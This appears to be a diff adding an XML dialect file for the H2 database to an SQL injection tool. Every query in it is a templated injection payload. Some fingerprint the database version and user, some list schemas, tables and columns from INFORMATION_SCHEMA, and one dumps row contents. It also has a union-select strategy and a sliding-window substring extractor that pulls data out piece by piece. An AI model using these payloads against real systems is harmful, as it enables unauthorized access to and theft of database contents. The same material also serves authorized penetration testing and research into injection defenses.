@@ -1,0 +1,138 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<model>
+    <vendor></vendor>
+    <resource>
+        <info>
+concat(
+    concat_ws(
+        '${ENCLOSE_VALUE_SQL}',
+        H2VERSION(),
+        database(),
+        user()
+    ),
+    '${TRAIL_SQL}'
+)
+        </info>
+        <schema>
+            <database>
+select concat(
+    group_concat(
+        '${ENCLOSE_VALUE_SQL}'
+        ||r
+        ||'${SEPARATOR_QTE_SQL}'
+        ||cast(q as char)
+        ||'${ENCLOSE_VALUE_SQL}'
+        order by r
+        separator '${SEPARATOR_CELL_SQL}'
+    ),
+    '${TRAIL_SQL}'
+) from (
+    select
+        cast(schema_name as char)r,
+        count(TABLE_NAME)q
+    from INFORMATION_SCHEMA.tables t
+    right join INFORMATION_SCHEMA.schemata s
+    on t.table_schema = s.schema_name
+    group by r
+    {limit}
+)x
+            </database>
+            <table>
+select concat(
+    group_concat(
+        '${ENCLOSE_VALUE_SQL}'
+        ||cast(r as char)
+        ||'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+        order by r
+        separator '${SEPARATOR_CELL_SQL}'
+    ),
+    '${TRAIL_SQL}'
+) from (
+    select TABLE_NAME r
+    from information_schema.tables
+    where TABLE_SCHEMA='${DATABASE}'
+    order by r
+    {limit}
+)x
+            </table>
+            <column>
+select concat(
+    group_concat(
+        '${ENCLOSE_VALUE_SQL}'
+        ||cast(n as char)
+        ||'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+        order by n
+        separator '${SEPARATOR_CELL_SQL}'
+    ),
+    '${TRAIL_SQL}'
+) from (
+    select COLUMN_NAME n
+    from information_schema.columns
+    where TABLE_SCHEMA='${DATABASE}'
+    and TABLE_NAME='${TABLE}'
+    order by n
+    {limit}
+)x
+            </column>
+            <row>
+                <query>
+select concat(
+    group_concat(
+        '${ENCLOSE_VALUE_SQL}'
+        ||r
+        ||'${SEPARATOR_QTE_SQL}'
+        ||cast(q as char)
+        ||'${ENCLOSE_VALUE_SQL}'
+        order by r 
+        separator '${SEPARATOR_CELL_SQL}'
+    ),
+    '${TRAIL_SQL}'
+) from (
+    select
+        cast(${FIELDS} as char)r,
+        count(*)q
+    from `${DATABASE}`.`${TABLE}`
+    group by r
+    {limit}
+)x
+                </query>
+                <fields>
+                <field>trim(ifnull(`${FIELD}`,''))</field>
+                <concat>||'%7f'||</concat>
+                </fields>
+            </row>
+        </schema>
+    </resource>
+    <strategy>
+        <configuration>
+            <slidingWindow>
+(
+    select
+        /**
+         * If reach end of string (concat(SQLi+NULL)) then concat nullifies the result
+         */
+        concat(
+            'SQLi',
+            substr(
+                (${INJECTION}),
+                ${INDEX},
+                /**
+                 * Minus 'SQLi' should apply
+                 */
+                ${CAPACITY}
+            )
+        )
+)
+            </slidingWindow>
+            <limit> limit ${LIMIT},65536</limit>
+            <failsafe>''||1337${INDICE}7330%2b1</failsafe>
+            <calibrator>repeat('%23',65536)</calibrator>
+            <limitBoundary>0</limitBoundary>
+        </configuration>
+        <normal>
+            <indices> union select ${INDICES}</indices>
+            <capacity>(select concat('SQLi',${INDICE},${CALIBRATOR},'${TRAIL_SQL}'))</capacity>
+            <orderBy> order by 1337</orderBy>
+        </normal>
+    </strategy>
+</model>
